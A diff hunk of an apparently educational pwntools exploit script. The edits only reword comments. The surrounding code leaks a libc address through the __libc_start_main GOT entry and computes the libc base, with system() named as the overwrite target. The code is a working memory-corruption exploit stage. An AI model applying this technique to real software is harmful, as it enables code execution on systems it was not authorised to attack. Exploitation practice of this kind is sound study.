@@ -130,9 +130,9 @@ p = binary.process()
 
 libc_start_main_reloc = 0x0804a014 # where pointer to libc_start_main is stored
 
-# libc function offsets (this varies depending on the system's libc; reverse it yourself)
-libc_start_main_offset = 0x0001f170 # for leaking
-system_offset = 0x00049680          # for overwriting
+# libc function offsets (this varies depending on the system's libc; find it yourself)
+libc_start_main_offset = 0x0001f170 # for leaking libc address
+system_offset = 0x00049680          # our target value
 
 exploit = b""
 exploit += p32(libc_start_main_reloc)
@@ -142,7 +142,7 @@ log.info("leaking libc address")
 log.info("Leak payload: %s" % repr(exploit))
 
 p.sendline(exploit)
-p.recv(4) # we don't need this (this is libc_start_main_reloc)
+p.recv(4) # we don't need this (this is just an echo of libc_start_main_reloc)
 leak = u32(p.recv(4)) # get the next four-byte chunk (this is the leaked address)
 p.recvline() # the rest is junk to us
 libc_base = leak - libc_start_main_offset
